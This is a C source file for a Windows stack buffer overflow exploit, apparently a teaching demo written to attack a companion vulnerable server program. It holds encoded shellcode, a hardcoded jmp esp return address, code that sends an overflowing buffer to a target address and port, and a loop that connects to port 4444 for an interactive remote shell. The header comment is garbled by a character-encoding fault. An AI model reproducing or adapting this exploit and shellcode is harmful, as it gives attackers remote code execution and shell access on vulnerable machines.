/* exploit.c
*
*  ��������͸��������ʾ����
*  ���ߣ�san, alert7, eyas, watercloud
*
*  ���server.cpp�����ó���
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#pragma comment (lib,"ws2_32")

// jmp esp address of chinese version
//#define JUMPESP "\x12\x45\xfa\x7f"
#define JUMPESP "\xed\x1e\x96\x7c"

char shellcode[] =
"\xeb\x10\x5b\x4b\x33\xc9\x66\xb9\x33\x01\x80\x34\x0b\xf8\xe2\xfa"
"\xeb\x05\xe8\xeb\xff\xff\xff\x11\xfd\xf9\xf8\xf8\xa7\x9c\x59\xc8"
"\xf8\xf8\xf8\x73\xb8\xf4\x73\x88\xe4\x55\x73\x90\xf0\x73\x0f\x92"
"\xfb\xa1\x10\x5d\xf8\xf8\xf8\x1a\x01\x90\xcb\xca\xf8\xf8\x90\x8f"
"\x8b\xca\xa7\xac\x07\xee\x73\x10\x92\xfd\xa1\x10\x74\xf8\xf8\xf8"
"\x1a\x01\x7b\x3f\xfc\x79\x14\x68\xf9\xf8\xf8\xac\x90\xf9\xf9\xf8"
"\xf8\x07\xae\xf4\xa8\xa8\xa8\xa8\x92\xf9\x92\xfa\x07\xae\xe8\x73"
"\x20\xcb\x38\xa8\xa8\x9e\x73\xae\xd8\x7e\x2e\x39\x32\xe8\x9e\x42"
"\xfa\xf8\xaa\x73\x2c\x92\xe8\xaa\xab\x07\xae\xec\x92\xf9\xab\x07"
"\xae\xe0\xa8\xa8\xab\x07\xae\xe4\x73\x20\x90\x9b\x95\x9c\xf8\x75"
"\xec\xdc\x7b\x14\xac\x73\x04\x92\xec\xa1\xcb\x38\x71\xfc\x77\x1a"
"\x03\x3e\xbf\xe8\xbc\x06\xbf\xc4\x06\xbf\xc5\x71\xa7\xb0\x71\xa7"
"\xb4\x71\xa7\xa8\x75\xbf\xe8\xaf\xa8\xa9\xa9\xa9\x92\xf9\xa9\xa9"
"\xaa\xa9\x07\xae\xfc\xcb\x38\xb0\xa8\x07\xae\xf0\xa9\xae\x73\x8d"
"\xc4\x73\x8c\xd6\x80\xfb\x0d\xae\x73\x8e\xd8\xfb\x0d\xcb\x31\xb1"
"\xb9\x55\xfb\x3d\xcb\x23\xf7\x46\xe8\xc2\x2e\x8c\xf0\x39\x33\xff"
"\xfb\x22\xb8\x13\x09\xc3\xe7\x8d\x1f\xa6\x73\xa6\xdc\xfb\x25\x9e"
"\x73\xf4\xb3\x73\xa6\xe4\xfb\x25\x73\xfc\x73\xfb\x3d\x53\xa6\xa1"
"\x3b\x10\x0e\x06\x07\x07\xca\x8c\x69\xf4\x31\x44\x5e\x93\x77\x0a"
"\xe0\x99\xc5\x92\x4c\x78\xd5\xca\x80\x26\x9c\xe8\x5f\x25\xf4\x67"
"\x2b\xb3\x49\xe6\x6f\xf9\xa4\xe9\x47\x1d";
// ripped from isno
int Make_Connection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    SOCKET s;
    int i;
    DWORD bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        closesocket(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctlsocket(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        closesocket(s);
        return -3;
    }
    if(i==0)
    {
        closesocket(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        closesocket(s);
        return -5;
    }
    ioctlsocket(s,FIONBIO,&bf);
    return s;
}

/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
    int     l;
    char    buf[512];
    struct    timeval time;
    unsigned long    ul[2];

    time.tv_sec = 1;
    time.tv_usec = 0;

    while (1)
    {
        ul[0] = 1;
        ul[1] = sock;

        l = select (0, (fd_set *)&ul, NULL, NULL, &time);
        if(l==1)
        {
            l = recv (sock, buf, sizeof (buf), 0);
            if (l <= 0)
            {
                printf ("[-] Connection closed.\n");
                return;
            }
            l = write (1, buf, l);
            if (l <= 0)
            {
                printf ("[-] Connection closed.\n");
                return;
            }
        }
        else
        {
            l = read (0, buf, sizeof (buf));
            if (l <= 0)
            {
                printf("[-] Connection closed.\n");
                return;
            }
            l = send(sock, buf, l, 0);
            if (l <= 0)
            {
                printf("[-] Connection closed.\n");
                return;
            }
        }
    }
}

int main(int argc, char *argv[])
{
    SOCKET  c,s;
    WSADATA WSAData;
    char Buff[1024];

    if (argc < 3)
    {
        fprintf(stderr, "Usage: %s remote_addr remote_port", argv[0]);
        exit(1);
    }

    if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
    {
        printf("[-] WSAStartup failed.\n");
        WSACleanup();
        exit(1);
    }

    memset(Buff, 0x90, sizeof(Buff)-1);

    strcpy(Buff+56, JUMPESP);
    strcpy(Buff+60, shellcode);

    s = Make_Connection(argv[1], atoi(argv[2]), 10);
    if(s<0)
    {
        printf("[-] connect err.\n");
        exit(1);
    }

    send(s,Buff,sizeof(Buff),0);

    Sleep(1000);

    c = Make_Connection(argv[1], 4444, 10);
    shell(c);

    WSACleanup();
    return 1;
}
